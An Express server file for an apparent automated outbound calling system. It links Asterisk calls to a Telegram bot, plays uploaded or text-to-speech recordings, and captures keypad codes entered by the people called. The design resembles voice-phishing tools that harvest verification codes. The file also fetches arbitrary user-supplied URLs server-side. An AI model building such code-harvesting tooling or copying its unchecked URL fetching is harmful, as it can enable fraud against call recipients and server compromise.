const createError = require("http-errors");
const express = require("express");
const path = require("path");
const cookieParser = require("cookie-parser");
const logger = require("morgan");
const mongoose = require("mongoose");
const config = require("./config/index");
const compression = require("compression");
const cors = require("cors");
const helmet = require("helmet");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");

const indexRouter = require("./routes/index");
const { initializeBot } = require("./telegram_bot");
const { InteractiveCallManager } = require("./interactive-call-manager");
const { TerminalInterface } = require("./terminal-interface");

const app = express();
mongoose.set("strictQuery", true);

// Initialize interactive call manager
const callManager = new InteractiveCallManager();

// Initialize terminal interface
const terminalInterface = new TerminalInterface();

// Export the call manager instance for use in other modules
app.locals.callManager = callManager;

// Setup call manager events for real-time updates
callManager.on('callUpdated', (callId, message) => {
  console.log(`Call ${callId} updated: ${message}`);
});

callManager.on('showTelegramMenu', (callId) => {
  console.log(`Call ${callId} requesting Telegram menu`);
});

callManager.on('dtmfCodeReceived', (callId, code) => {
  console.log(`Call ${callId} DTMF code received: ${code}`);
});

// DISABLED: Automatic terminal prompts to prevent interference with Telegram bot
// callManager.on('humanDetected', (callId) => {
//   terminalInterface.setActiveCallId(callId);
//   terminalInterface.promptForDTMFDigit1(callId);
// });

// callManager.on('telegramMenuShown', (callId) => {
//   setTimeout(() => {
//     terminalInterface.promptForDTMFCode(callId);
//   }, 2000);
// });

// Link DTMF events from asterisk/instance to call manager
try {
  const { dtmfEventEmitter } = require('./asterisk/instance');
  
  // Handle call answered events from both UserEvent and Newstate
  dtmfEventEmitter.on('callAnswered', (callId) => {
    console.log(`🔗 DTMF Event Bridge: callAnswered for call ${callId}`);
    callManager.emit('callAnswered', callId, 'unknown');
    
    // Wait a bit then emit human detected
    setTimeout(() => {
      console.log(`🔗 DTMF Event Bridge: simulating humanDetected for call ${callId}`);
      callManager.emit('humanDetected', callId);
    }, 2000);
  });
  
  dtmfEventEmitter.on('menuOption', (callId, option) => {
    console.log(`🔗 DTMF Event Bridge: menuOption ${option} for call ${callId}`);
    if (option === '1') {
      console.log(`🎯 Triggering showTelegramMenu for call ${callId}`);
      callManager.emit('showTelegramMenu', callId);
    } else if (option === '2') {
      callManager.emit('waitingForDTMF', callId);
    } else if (option === '9') {
      callManager.emit('connectToCaller', callId);
    }
  });
  
  dtmfEventEmitter.on('dtmfCodeReceived', (callId, code) => {
    console.log(`🔗 DTMF Event Bridge: dtmfCodeReceived ${code} for call ${callId}`);
    callManager.emit('dtmfCodeReceived', callId, code);
  });
  
  dtmfEventEmitter.on('callEnded', (callId, callData) => {
    console.log(`🔗 DTMF Event Bridge: callEnded for call ${callId}`);
    callManager.emit('callEnded', callId);
  });
  
  console.log('✅ DTMF Event Bridge established successfully');
} catch (error) {
  console.error('❌ Failed to establish DTMF Event Bridge:', error);
}

// Helper function to validate URLs
function isValidUrl(string) {
  if (!string) return false;
  try {
    const url = new URL(string);
    return url.protocol === "http:" || url.protocol === "https:";
  } catch (_) {
    return false;
  }
}

// Helper function to download files from URLs
async function downloadFile(url) {
  const response = await axios.get(url, { responseType: "arraybuffer" });
  return Buffer.from(response.data);
}

// Configure multer for file uploads
const upload = multer({
  dest: path.join(__dirname, "uploads"),
  limits: {
    fileSize: 50 * 1024 * 1024, // 50MB limit
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = [
      "audio/wav",
      "audio/wave",
      "audio/x-wav",
      "audio/mpeg",
      "audio/mp3",
      "application/octet-stream"
    ];
    if (allowedTypes.includes(file.mimetype) || file.originalname.endsWith(".wav") || isValidUrl(req.body.audioFileLink)) {
      cb(null, true);
    } else {
      cb(new Error("Only audio files (WAV, MP3) are allowed"));
    }
  }
});

// view engine setup
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "jade");

// Initialize database connection
main().catch((err) => console.error("Failed to connect to database:", err));

app.use(cors());
app.use(helmet({ crossOriginResourcePolicy: false }));
app.use(compression());
app.use(logger("dev"));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, "public")));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, "uploads");
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// API Routes for Interactive Calling
app.post("/api/make-call", async (req, res) => {
  try {
    const { phoneNumber, name } = req.body;
    if (!phoneNumber) {
      return res.status(400).json({ error: "Phone number is required" });
    }

    const callId = await callManager.initiateCall(phoneNumber, name || 'Unknown');
    res.json({ success: true, callId, message: "Call initiated" });
  } catch (error) {
    console.error("Error initiating call:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/upload-audio", upload.single("audioFile"), async (req, res) => {
  try {
    const { callId, audioFileLink, ttsText } = req.body;
    if (!req.file && !audioFileLink && !ttsText) {
      return res.status(400).json({ error: "Audio file, link, or TTS text is required" });
    }
    if (!callId) {
      return res.status(400).json({ error: "Call ID is required" });
    }

    let audioPath;
    if (ttsText) {
      // Generate TTS audio
      const gtts = require('google-tts-api');
      const url = gtts.getAudioUrl(ttsText, {
        lang: 'en',
        slow: false,
        host: 'https://translate.google.com',
      });
      const fileBuffer = await downloadFile(url);
      const uploadsDir = path.join(__dirname, "uploads");
      const fileName = `tts_${callId}.mp3`;
      audioPath = path.join(uploadsDir, fileName);
      fs.writeFileSync(audioPath, fileBuffer);
    } else if (audioFileLink) {
      // Validate that the link points to an audio file
      const fileExtension = audioFileLink.split('.').pop().toLowerCase();
      if (!['wav', 'mp3', 'ogg', 'm4a'].includes(fileExtension)) {
        return res.status(400).json({ error: "Link must point to a valid audio file (WAV, MP3, OGG, M4A)" });
      }
      
      const fileBuffer = await downloadFile(audioFileLink);
      const uploadsDir = path.join(__dirname, "uploads");
      const fileName = `audio_${callId}.${fileExtension}`;
      audioPath = path.join(uploadsDir, fileName);
      fs.writeFileSync(audioPath, fileBuffer);
    } else {
      audioPath = req.file.path;
    }

    await callManager.uploadAudioForCall(callId, audioPath);

    res.json({ 
      success: true, 
      message: "Audio uploaded successfully",
      audioPath: audioPath
    });
  } catch (error) {
    console.error("Error uploading audio:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/handle-dtmf", async (req, res) => {
  try {
    const { callId, digit } = req.body;
    if (!callId || !digit) {
      return res.status(400).json({ error: "Call ID and digit are required" });
    }

    const result = await callManager.handleDTMF(callId, digit);
    res.json({ success: true, result });
  } catch (error) {
    console.error("Error handling DTMF:", error);
    res.status(500).json({ error: error.message });
  }
});

// New endpoint for handling button clicks
app.post("/api/handle-button-click", async (req, res) => {
  try {
    const { callId, buttonId } = req.body;
    if (!callId || !buttonId) {
      return res.status(400).json({ error: "Call ID and button ID are required" });
    }

    const result = await callManager.handleButtonClick(callId, buttonId);
    res.json({ success: true, result });
  } catch (error) {
    console.error("Error handling button click:", error);
    res.status(500).json({ error: error.message });
  }
});

app.get("/api/call-status/:callId", async (req, res) => {
  try {
    const { callId } = req.params;
    const status = await callManager.getCallStatus(callId);
    res.json({ success: true, status });
  } catch (error) {
    console.error("Error getting call status:", error);
    res.status(500).json({ error: error.message });
  }
});

app.get("/api/active-calls", async (req, res) => {
  try {
    const activeCalls = await callManager.getActiveCalls();
    res.json({ success: true, activeCalls });
  } catch (error) {
    console.error("Error getting active calls:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/setup-tts-recordings", async (req, res) => {
  try {
    const { callId, recording1Text, recording2Text, recording3Text } = req.body;
    if (!callId) {
      return res.status(400).json({ error: "Call ID is required" });
    }

    const gtts = require('google-tts-api');
    const recordings = {};
    const uploadsDir = path.join(__dirname, "uploads");

    // Generate TTS for each recording if text is provided
    if (recording1Text) {
      const url1 = gtts.getAudioUrl(recording1Text, {
        lang: 'en',
        slow: false,
        host: 'https://translate.google.com',
      });
      const fileBuffer1 = await downloadFile(url1);
      const fileName1 = `tts_recording1_${callId}.mp3`;
      const audioPath1 = path.join(uploadsDir, fileName1);
      fs.writeFileSync(audioPath1, fileBuffer1);
      recordings.recording1 = { text: recording1Text, audioPath: audioPath1 };
    }

    if (recording2Text) {
      const url2 = gtts.getAudioUrl(recording2Text, {
        lang: 'en',
        slow: false,
        host: 'https://translate.google.com',
      });
      const fileBuffer2 = await downloadFile(url2);
      const fileName2 = `tts_recording2_${callId}.mp3`;
      const audioPath2 = path.join(uploadsDir, fileName2);
      fs.writeFileSync(audioPath2, fileBuffer2);
      recordings.recording2 = { text: recording2Text, audioPath: audioPath2 };
    }

    if (recording3Text) {
      const url3 = gtts.getAudioUrl(recording3Text, {
        lang: 'en',
        slow: false,
        host: 'https://translate.google.com',
      });
      const fileBuffer3 = await downloadFile(url3);
      const fileName3 = `tts_recording3_${callId}.mp3`;
      const audioPath3 = path.join(uploadsDir, fileName3);
      fs.writeFileSync(audioPath3, fileBuffer3);
      recordings.recording3 = { text: recording3Text, audioPath: audioPath3 };
    }

    // Store recordings in call manager
    await callManager.setupTTSRecordings(callId, recordings);

    res.json({ 
      success: true, 
      message: "TTS recordings setup successfully",
      recordings: recordings
    });
  } catch (error) {
    console.error("Error setting up TTS recordings:", error);
    res.status(500).json({ error: error.message });
  }
});

app.get("/api/tts-recordings/:callId", async (req, res) => {
  try {
    const { callId } = req.params;
    const callStatus = await callManager.getCallStatus(callId);
    const ttsRecordings = callStatus.ttsRecordings || {};
    
    res.json({ 
      success: true, 
      callId: callId,
      ttsRecordings: ttsRecordings
    });
  } catch (error) {
    console.error("Error getting TTS recordings:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/send-manual-dtmf", async (req, res) => {
  try {
    const { callId, digit } = req.body;
    if (!callId || !digit) {
      return res.status(400).json({ error: "Call ID and digit are required" });
    }

    const result = await callManager.sendManualDTMF(callId, digit);
    res.json({ success: true, result });
  } catch (error) {
    console.error("Error sending manual DTMF:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/show-dtmf-options", async (req, res) => {
  try {
    const { callId } = req.body;
    if (!callId) {
      return res.status(400).json({ error: "Call ID is required" });
    }

    const result = await callManager.showDTMFOptions(callId);
    res.json({ success: true, result });
  } catch (error) {
    console.error("Error showing DTMF options:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/send-dtmf-code", async (req, res) => {
  try {
    const { callId, code } = req.body;
    if (!callId || !code) {
      return res.status(400).json({ error: "Call ID and code are required" });
    }

    const result = await callManager.sendDTMFCode(callId, code);
    res.json({ success: true, result });
  } catch (error) {
    console.error("Error sending DTMF code:", error);
    res.status(500).json({ error: error.message });
  }
});

app.post("/api/end-call", async (req, res) => {
  try {
    const { callId } = req.body;
    if (!callId) {
      return res.status(400).json({ error: "Call ID is required" });
    }

    await callManager.endCall(callId);
    res.json({ success: true, message: "Call ended" });
  } catch (error) {
    console.error("Error ending call:", error);
    res.status(500).json({ error: error.message });
  }
});

app.use("/", indexRouter);

async function main() {
  try {
    await mongoose.connect(config.mongodb_uri);
    console.log("Database connection established");
    
    // Initialize call manager after database connection
    await callManager.initialize();
    console.log("Interactive call manager initialized");
    
    // Initialize bot after call manager is ready
    initializeBot();
  } catch (err) {
    console.error("Database connection error:", err);
    process.exit(1);
  }
}

// catch 404 and forward to error handler
app.use(function (req, res, next) {
  next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get("env") === "development" ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render("error");
});

module.exports = app;
